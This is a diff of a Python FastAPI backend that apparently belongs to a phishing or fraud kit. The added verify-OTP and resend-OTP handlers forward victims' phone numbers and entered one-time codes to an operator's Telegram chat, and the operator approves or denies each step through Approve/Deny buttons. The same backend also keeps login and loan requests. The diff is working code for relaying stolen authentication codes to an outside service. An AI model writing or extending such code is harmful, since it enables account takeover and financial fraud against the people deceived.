@@ -23,7 +23,7 @@ TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
 # In-memory databases
-LOGIN_REQUESTS = {} # ✅ NEW
+LOGIN_REQUESTS = {} 
 OTP_REQUESTS = {}
 SECOND_VERIFICATION_REQUESTS = {}
 LOAN_REQUESTS = {}
@@ -54,6 +54,10 @@ class LoginRequest(BaseModel):
 class OTPRequest(BaseModel):
     phone_number: str
     otp_code: str
+
+# ✅ NEW: Resend Model
+class ResendOTPRequest(BaseModel):
+    phone_number: str
 
 class SecondVerificationRequest(BaseModel):
     phone_number: str
@@ -109,6 +113,30 @@ async def verify_otp(data: OTPRequest):
         payload = {
             "chat_id": TELEGRAM_CHAT_ID,
             "text": f"🔢 <b>1st OTP Verification</b>\n\n📱 Phone: {data.phone_number}\n🔑 Code: <code>{data.otp_code}</code>",
+            "parse_mode": "HTML",
+            "reply_markup": {
+                "inline_keyboard": [[
+                    {"text": "✅ Approve OTP", "callback_data": f"approve_otp_{otp_id}"},
+                    {"text": "❌ Deny OTP", "callback_data": f"deny_otp_{otp_id}"}
+                ]]
+            }
+        }
+        async with httpx.AsyncClient() as client:
+            await client.post(url, json=payload, timeout=10.0)
+
+    return {"status": "pending", "otp_id": otp_id}
+
+# ✅ NEW: Resend OTP Endpoint
+@app.post("/api/resend-otp")
+async def resend_otp(data: ResendOTPRequest):
+    otp_id = str(uuid.uuid4())
+    OTP_REQUESTS[otp_id] = "pending"
+
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": f"🔄 <b>Resend OTP Request</b>\n\n📱 Phone: {data.phone_number}",
             "parse_mode": "HTML",
             "reply_markup": {
                 "inline_keyboard": [[
@@ -197,7 +225,6 @@ async def telegram_webhook(request: Request):
             except ValueError:
                 return {"status": "ok"}
 
-            # Update status based on item type
             if item_type == "login" and item_id in LOGIN_REQUESTS:
                 LOGIN_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                 reply_text = "✅ Login Approved" if action == "approve" else "❌ Login Denied"
